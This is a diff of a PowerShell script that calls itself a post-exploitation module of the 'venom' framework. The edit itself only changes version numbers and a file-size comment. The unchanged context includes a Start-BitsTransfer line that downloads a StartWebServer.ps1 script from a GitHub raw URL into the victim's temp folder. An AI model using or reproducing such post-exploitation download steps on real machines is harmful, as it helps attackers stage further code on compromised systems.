@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: BitsTransfer
-   PS cmdlet Dev version: v1.2.7
+   PS cmdlet Dev version: v1.2.6
 
 .DESCRIPTION
    This cmdlet belongs to the structure of venom v1.0.17.8 as a post-exploitation module.
@@ -93,7 +93,7 @@
 
 
 ## Var declarations
-$CmdletVersion = "v1.2.7"
+$CmdletVersion = "v1.2.6"
 $Remote_hostName = hostname
 $OsVersion = [System.Environment]::OSVersion.Version
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
@@ -915,7 +915,7 @@ If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/StartWebServer.ps1 -Destination $Env:TMP\StartWebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\StartWebServer.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,080078125/KB
+      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,078125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\StartWebServer.ps1"){Remove-Item -Path "$Env:TMP\StartWebServer.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
